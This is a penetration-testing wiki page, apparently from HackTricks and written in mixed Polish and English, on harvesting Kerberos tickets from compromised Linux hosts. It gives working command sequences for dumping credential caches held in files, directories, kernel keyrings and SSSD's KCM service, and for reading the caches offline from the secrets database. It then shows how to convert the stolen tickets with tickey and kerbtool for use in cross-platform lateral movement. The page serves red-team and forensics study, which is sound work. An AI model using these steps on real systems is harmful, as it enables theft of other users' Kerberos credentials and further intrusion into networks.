# Pozyskiwanie biletów z Linux

{{#include ../../banners/hacktricks-training.md}}

### Przechowywanie poświadczeń w systemie Linux

Systemy Linux przechowują poświadczenia w trzech typach pamięci podręcznej, a mianowicie **Files** (w katalogu `/tmp`), **Kernel Keyrings** (specjalny segment w jądrze Linux) oraz **Process Memory** (dla użycia przez pojedynczy proces). Zmienna **default_ccache_name** w `/etc/krb5.conf` ujawnia używany typ przechowywania, domyślnie `FILE:/tmp/krb5cc_%{uid}` jeśli nie określono.

MIT/Heimdal również obsługują dodatkowe backendy, na które warto zwrócić uwagę podczas post-exploitation:

- `DIR:/run/user/%{uid}/krb5cc` dla cache'ów opartych na katalogu obsługujących wiele biletów (domyślnie systemd-logind w nowoczesnych dystrybucjach).
- `KEYRING:persistent:%{uid}` lub `KEYRING:session` do przechowywania ccaches w kernel keyring (`KEY_SPEC_SESSION_KEYRING`, `KEY_SPEC_USER_KEYRING`, itd.).
- `KCM:%{uid}` gdy SSSD’s Kerberos Cache Manager daemon (kcm) nadzoruje przechowywanie biletów.
- `MEMORY:unique_id` dla pamięci podręcznej lokalnej dla procesu tworzonej przez biblioteki (`gssproxy`, `sshd`, itd.).

Za każdym razem, gdy uzyskasz shell, zrzucaj `KRB5CCNAME` z `/proc/<pid>/environ` interesujących demonów (np. Apache, sshd, gssproxy), aby dowiedzieć się, który backend cache jest używany zanim zaczniesz kopiować pliki.

### Enumeracja aktywnych cache'ów

Zenumeruj cache przed ekstrakcją, aby nie pominąć wartościowych biletów:
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
The combination of `klist`, `keyctl`, and `/proc` inspection quickly reveals whether credentials live in files, keyrings, or KCM so you can pick the right dumping technique.

### Ekstrakcja poświadczeń

The 2017 paper, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), outlines methods for extracting credentials from keyrings and processes, emphasizing the Linux kernel's keyring mechanism for managing and storing keys.

#### Przegląd ekstrakcji keyringów

The **keyctl system call**, introduced in kernel version 2.6.10, allows user space applications to interact with kernel keyrings. Credentials in keyrings are stored as components (default principal and credentials), distinct from file ccaches which also include a header. The **hercules.sh script** from the paper demonstrates extracting and reconstructing these components into a usable file ccache for credential theft. Remember that keyring-stored ccaches may live under `KEYRING:persistent:%{uid}` (permanent across logins), `KEYRING:session` (cleared on logout), or even `KEY_SPEC_THREAD_KEYRING` for services spawning helper threads—so always enumerate all keyring types for the compromised UID.

#### Manual KEYRING Workflow

You can manually harvest tickets without helper scripts whenever `default_ccache_name` is set to `KEYRING:`:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
Jeśli przechowywanych jest kilka principals, powtórz krok `keyctl pipe` dla każdego numeru seryjnego, a następnie skonwertuj wyodrębniony ccache na zgodny z Windows `.kirbi`/`.ccache` przy użyciu narzędzi takich jak `kerbtool` (patrz niżej) lub `ticketConverter.py` przed odtworzeniem go z innych maszyn.

#### Szybkie sposoby kradzieży cache `FILE:`/`DIR:`

Gdy poświadczenia są przechowywane jako cache `FILE:` lub `DIR:`, zwykle wystarczą proste operacje na plikach:
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Katalogi cache zawierają po jednym pliku na ticket usługi, dlatego skompresuj i exfiltrate cały katalog, aby pary TGT + TGS pozostały nienaruszone. Możesz też skierować swoje narzędzia bezpośrednio na katalog: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Zrzucanie cache'ów zarządzanych przez KCM

Menedżer pamięci podręcznej Kerberos SSSD (kcm) pośredniczy w przechowywaniu poświadczeń przez `/var/run/kcm/kcmsock` (lub `/run/.heim_org.h5l.kcm-socket`) i zapisuje zaszyfrowane bloby w `/var/lib/sss/secrets/` wraz z plikiem `.secrets.mkey`. Przebieg ataku:

1. Zidentyfikuj użycie KCM przez `/etc/krb5.conf` (`default_ccache_name = KCM:`) lub wyjścia `klist -l`.
2. Jeśli masz UID 0 lub należysz do domeny SELinux `kcm`, wypisz pamięci podręczne za pomocą narzędzia zarządzającego:
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. Podejście offline: skopiuj `/var/lib/sss/secrets/secrets.ldb` oraz `/var/lib/sss/secrets/.secrets.mkey`, a następnie uruchom `SSSDKCMExtractor` (lub podobne PoC), aby odszyfrować i zrekonstruować ccaches bez korzystania z żywego socketu. Jest to szczególnie przydatne w forensics lub gdy socket ACLs cię blokują, ale dostęp do dysku jest możliwy.

Ponieważ demon kcm respektuje UID-based ACLs wymuszane przez SSSD, zazwyczaj wymagane jest privilege escalation do root (lub kompromitacja `sssd_kcm`), ale po jego uzyskaniu możesz zrzucić TGT każdego użytkownika w ciągu kilku sekund.

### Ticket Extraction Tooling

Automatyzacja powyższych kroków zmniejsza liczbę błędów i dostarcza cross-platform materiał z ticketami, który możesz odtworzyć za pomocą Windows tooling.

#### Tickey

Opierając się na zasadach skryptu **hercules.sh**, narzędzie [**tickey**](https://github.com/TarlogicSecurity/tickey) jest specjalnie zaprojektowane do ekstrakcji ticketów z keyrings, uruchamiane przez `/tmp/tickey -i`. Enumeruje kernel keyrings, rekonstruuje zserializowane ccaches i zapisuje MIT-compatible cache files, które możesz od razu przekazać do `klist`, `impacket-*` lub `kerberoast` tooling.

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) to nowoczesne narzędzie napisane w Go, działające natywnie na Linux, które potrafi parsować, konwertować oraz request Kerberos tickets. Dwa przydatne przypadki użycia przy harvestingu z Linux boxów:
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
Posiadanie zarówno tickey, jak i kerbtool na implant host umożliwia płynne poruszanie się między Linux, Windows oraz cross-platform Kerberos attack chains.

## Źródła

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
